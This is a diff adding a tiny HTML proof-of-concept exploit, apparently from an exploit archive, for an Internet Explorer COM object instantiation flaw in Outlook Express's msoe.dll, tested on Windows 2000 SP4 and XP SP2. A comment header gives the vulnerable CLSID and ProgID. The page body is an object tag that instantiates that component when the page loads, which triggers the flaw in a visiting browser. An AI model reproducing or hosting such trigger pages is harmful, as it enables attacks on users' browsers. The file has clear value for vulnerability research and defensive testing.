@@ -1,0 +1,16 @@
+ &lt;!--
+ // Internet Explorer (msoe.dll) COM Object Instantiation Vulnerability
+ // tested: 2000SP4/XPSP2 CN
+
+ // http://www.xsec.org
+ // nop (nop#xsec.org)
+
+ // CLSID: {233A9694-667E-11d1-9DFB-006097D50408}
+ // Info: Outlook Express Address Book
+ // ProgID: OutlookExpress.AddressBook.1
+ // InprocServer32: %ProgramFiles%\Outlook Express\msoe.dll
+
+ --!&gt;
+ &lt;html&gt;&lt;body&gt;
+ &lt;object classid=&quot;CLSID:{233A9694-667E-11d1-9DFB-006097D50408}&quot; &gt;&lt;/object&gt;
+ &lt;/body&gt;&lt;/html&gt;
